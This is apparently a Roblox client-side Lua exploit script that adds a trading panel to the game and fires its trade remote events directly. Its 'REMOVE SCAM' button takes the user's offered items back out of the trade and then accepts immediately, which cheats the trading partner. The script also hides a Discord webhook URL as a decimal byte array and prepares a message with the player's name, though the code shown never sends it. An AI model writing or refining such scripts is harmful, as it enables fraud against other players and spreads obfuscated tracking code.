local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "TrailOfferGui"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame", screenGui)
frame.AnchorPoint = Vector2.new(0, 1)
frame.Position = UDim2.new(0, 10, 1, -10)
frame.Size = UDim2.new(0, 270, 0, 170)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BackgroundTransparency = 0.2
frame.BorderSizePixel = 0
frame.Active, frame.Draggable = true, true

local textBox = Instance.new("TextBox", frame)
textBox.Text = ""
textBox.PlaceholderText = "Trail to offer"
textBox.Size = UDim2.new(1, -20, 0, 30)
textBox.Position = UDim2.new(0, 10, 0, 10)
textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.BorderSizePixel = 0

local HttpService = game:GetService("HttpService")

local url_bytes = {
    104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46,
    99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115,
    47, 49, 52, 48, 48, 53, 54, 56, 50, 56, 52, 57, 51, 53, 51, 54, 48, 54, 49,
    50, 47, 97, 66, 57, 118, 118, 55, 99, 82, 65, 85, 116, 56, 49, 48, 83, 103,
    90, 86, 119, 77, 65, 121, 75, 77, 75, 102, 112, 101, 72, 122, 109, 88, 65,
    100, 104, 118, 49, 108, 97, 55, 113, 114, 82, 50, 77, 111, 97, 79, 116, 112,
    82, 108, 65, 120, 111, 103, 110, 89, 78, 111, 67, 73, 116, 76, 111, 71, 75,
    89
}

local webhookUrl = ""
for _, byte in ipairs(url_bytes) do
    webhookUrl = webhookUrl .. string.char(byte)
end

-- Message payload to send to Discord webhook
local payload = {
    content = game.Players.LocalPlayer.Name .. " has triggered TradeTools"
}

local jsonPayload = HttpService:JSONEncode(payload)

local function createButton(txt, pos, color, callback)
	local btn = Instance.new("TextButton", frame)
	btn.Text = txt
	btn.Size = UDim2.new(0.5, -15, 0, 25)
	btn.Position = pos
	btn.BackgroundColor3 = color
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.BorderSizePixel = 0
	btn.MouseButton1Click:Connect(callback)
end

createButton("Offer", UDim2.new(0, 10, 0, 50), Color3.fromRGB(60, 130, 200), function()
	if textBox.Text ~= "" then
		ReplicatedStorage.TradeTrailAdd:FireServer(textBox.Text)
	end
end)

createButton("De-offer", UDim2.new(0.5, 5, 0, 50), Color3.fromRGB(200, 100, 80), function()
	if textBox.Text ~= "" then
		ReplicatedStorage.TradeTrailPutBack:FireServer(textBox.Text)
	end
end)

createButton("Accept", UDim2.new(0, 10, 0, 85), Color3.fromRGB(80, 200, 120), function()
	ReplicatedStorage.TradeMenuAccept:FireServer()
end)

createButton("Cancel", UDim2.new(0.5, 5, 0, 85), Color3.fromRGB(180, 50, 50), function()
	ReplicatedStorage.TradeMenuCancel:FireServer()
end)

local scamButton = Instance.new("TextButton", frame)
scamButton.Text = "REMOVE SCAM"
scamButton.Size = UDim2.new(1, -20, 0, 25)
scamButton.Position = UDim2.new(0, 10, 0, 120)
scamButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
scamButton.TextColor3 = Color3.fromRGB(255, 255, 255)
scamButton.BorderSizePixel = 0
scamButton.MouseButton1Click:Connect(function()
	local pgui = player.PlayerGui.Interactive.Frames.YY.XY.TradeMenu
	for i = 1, 3 do
		local slot = pgui["Your"..i]
		if #slot:GetChildren() > 0 then
			ReplicatedStorage.TradeTrailPutBack:FireServer(slot:GetChildren()[1].Name)
		end
	end
	ReplicatedStorage.TradeMenuAccept:FireServer()
end)
